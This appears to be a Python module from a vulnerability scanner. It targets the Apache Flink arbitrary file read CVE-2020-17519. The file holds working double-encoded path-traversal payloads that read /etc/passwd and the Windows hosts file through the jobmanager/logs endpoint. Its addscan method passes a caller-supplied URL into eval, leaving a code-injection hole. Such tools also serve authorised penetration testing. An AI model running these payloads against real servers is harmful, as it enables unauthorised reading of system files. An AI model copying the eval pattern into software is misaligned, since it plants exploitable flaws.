#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ApacheFlink扫描类: 
        Flink 任意文件读取
            CVE-2020-17519
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.thread import thread
from payloads.ApacheFlink.cve_2020_17519 import cve_2020_17519_scan

class Flink():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheFlink'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2020_17519_payloads = [
            {
                'path': 'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
                'data': ''
            },
            {
                'path': 'jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fC:%252fWindows%252fSystem32%252fdrivers%252fetc%252fhosts',
                'data': ''
            }
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_17519_scan, url=url)
        ]

Flink.cve_2020_17519_scan = cve_2020_17519_scan

flink = Flink()